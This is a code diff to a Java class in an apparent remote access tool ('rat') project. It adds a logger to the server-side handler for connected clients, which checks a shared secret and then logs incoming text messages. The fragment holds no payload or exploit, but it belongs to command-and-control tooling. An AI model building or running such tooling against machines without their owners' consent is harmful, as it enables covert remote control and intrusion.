@@ -3,6 +3,7 @@ package main.java.rat.server.connectedClients;
 import main.java.Main;
 import main.java.rat.handlers.InputOutputHandler;
 import main.java.rat.listeners.InputOutputListener;
+import main.java.rat.logger.StringLogger;
 import main.java.rat.models.ComputerInfo;
 import main.java.rat.models.SocketMessage;
 import main.java.rat.models.StringSocketMessage;
@@ -14,16 +15,18 @@ public class RATConnectedClient implements InputOutputListener {
 
     private final RATServer server;
     private final InputOutputHandler inputOutput;
+    private final StringLogger logger;
     private boolean initStage = false;
     private int id;
 
     public ComputerInfo clientComputerInfo;
 
-    public RATConnectedClient(int id, InputOutputHandler inputOutputHandler, RATServer ratServer) {
+    public RATConnectedClient(StringLogger logger, int id, InputOutputHandler inputOutputHandler, RATServer ratServer) {
         this.id = id;
-        initStage = true;
         this.server = ratServer;
         this.inputOutput = inputOutputHandler;
+        this.logger = logger;
+        initStage = true;
         inputOutput.setListener(this);
     }
 
@@ -33,15 +36,18 @@ public class RATConnectedClient implements InputOutputListener {
     }
 
     @Override
-    public void receivedMessage(Object message) {
+    public void receivedMessage(Object rawMessage) {
         if(initStage) {
-            if(message.equals(Main.SECRET)) {
+            if(rawMessage.equals(Main.SECRET)) {
                 performInitStage();
             } else {
                 server.incorrectSecret(this);
             }
         } else {
-
+            SocketMessage message = (SocketMessage) rawMessage;
+            if(message.isInfo() && message instanceof StringSocketMessage) {
+                logger.log((String) message.getContent());
+            }
         }
     }
 
